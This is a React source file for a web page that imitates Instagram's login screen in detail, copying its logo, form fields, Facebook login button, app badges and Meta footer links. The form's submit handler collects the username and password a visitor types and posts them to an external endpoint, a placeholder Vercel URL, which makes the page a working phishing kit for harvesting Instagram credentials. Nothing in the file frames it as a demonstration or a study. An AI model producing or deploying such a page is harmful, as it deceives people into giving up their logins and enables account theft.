import log_img from "./assets/Screenshot 2025-03-31 032844.png";

function App() {
  const handleSubmit = async (e: React.FormEvent<HTMLFormElement>) => {
    e.preventDefault();

    const usernameInput = document.getElementById(
      "username"
    ) as HTMLInputElement;
    const passwordInput = document.getElementById(
      "password"
    ) as HTMLInputElement;

    if (!usernameInput || !passwordInput) {
      alert("Please fill out both fields.");
      return;
    }

    const formData = {
      username: usernameInput.value,
      password: passwordInput.value,
    };

    const response = await fetch(
      "https://your-vercel-app.vercel.app/api/submit",
      {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(formData),
      }
    );

    const data = await response.json();
    alert(data.message);
  };

  return (
    <div className="min-h-screen bg-gray-50 flex flex-col items-center justify-center py-12 px-4 sm:px-6 lg:px-8">
      <div className="max-w-[350px] w-full space-y-6">
        {/* Instagram Logo */}
        <div className="text-center flex items-center justify-center">
          <img src={log_img} />
        </div>

        {/* Login Form */}
        <div className="bg-white p-6 border border-gray-300 rounded-sm">
          <form onSubmit={handleSubmit} className="space-y-3">
            <div>
              <input
                id="username"
                type="text"
                placeholder="Phone number, username or email address"
                className="w-full px-2 py-[9px] text-sm border border-gray-300 rounded-sm focus:outline-none focus:border-gray-400"
              />
            </div>
            <div>
              <input
                id="password"
                type="password"
                placeholder="Password"
                className="w-full px-2 py-[9px] text-sm border border-gray-300 rounded-sm focus:outline-none focus:border-gray-400"
              />
            </div>
            <div>
              <button
                type="submit"
                className="w-full bg-[#0095f6] text-white py-[6px] rounded-lg font-semibold text-sm opacity-70"
              >
                Log in
              </button>
            </div>
          </form>

          <div className="mt-4 flex items-center justify-center space-x-2">
            <div className="h-px bg-gray-300 w-full"></div>
            <div className="text-gray-500 font-semibold text-sm px-4">OR</div>
            <div className="h-px bg-gray-300 w-full"></div>
          </div>

          <button className="w-full mt-6 text-[#385185] font-semibold flex items-center justify-center space-x-2 text-sm">
            <svg
              xmlns="http://www.w3.org/2000/svg"
              viewBox="0 0 48 48"
              className="w-5 h-5"
            >
              <path
                fill="#3B5998"
                d="M44 24c0-11.046-8.954-20-20-20S4 12.954 4 24c0 9.983 7.314 18.257 16.875 19.757V28.125h-5.078V24h5.078v-3.164c0-5.012 2.984-7.773 7.539-7.773 2.184 0 4.469.39 4.469.39v4.914h-2.516c-2.48 0-3.254 1.539-3.254 3.117V24h5.535l-.885 4.125h-4.65v15.632C36.686 42.257 44 33.983 44 24z"
              />
            </svg>
            <span>Log in with Facebook</span>
          </button>

          <div className="mt-4 text-center">
            <a href="#" className="text-xs text-[#385185]">
              Forgotten your password?
            </a>
          </div>
        </div>

        {/* Sign up section */}
        <div className="bg-white p-6 border border-gray-300 rounded-sm text-center">
          <p className="text-sm">
            Don't have an account?{" "}
            <a href="#" className="text-[#0095f6] font-semibold">
              Sign up
            </a>
          </p>
        </div>

        {/* Get the app section */}
        <div className="text-center space-y-4">
          <p className="text-sm">Get the app.</p>
          <div className="flex justify-center space-x-2">
            <a href="#" className="w-32">
              <img
                src="https://static.cdninstagram.com/rsrc.php/v3/yz/r/c5Rp7Ym-Klz.png"
                alt="Get it on Google Play"
                className="h-10 object-contain"
              />
            </a>
            <a href="#" className="w-32">
              <img
                src="https://static.cdninstagram.com/rsrc.php/v3/yu/r/EHY6QnZYdNX.png"
                alt="Get it from Microsoft"
                className="h-10 object-contain"
              />
            </a>
          </div>
        </div>

        {/* Footer links */}
        <div className="text-center text-xs text-gray-500 space-y-4">
          <div className="flex flex-wrap justify-center gap-x-4 gap-y-2">
            <a href="#">Meta</a>
            <a href="#">About</a>
            <a href="#">Blog</a>
            <a href="#">Jobs</a>
            <a href="#">Help</a>
            <a href="#">API</a>
            <a href="#">Privacy</a>
            <a href="#">Terms</a>
            <a href="#">Locations</a>
            <a href="#">Instagram Lite</a>
            <a href="#">Threads</a>
            <a href="#">Contact uploading and non-users</a>
            <a href="#">Meta Verified</a>
          </div>
        </div>
      </div>
    </div>
  );
}

export default App;
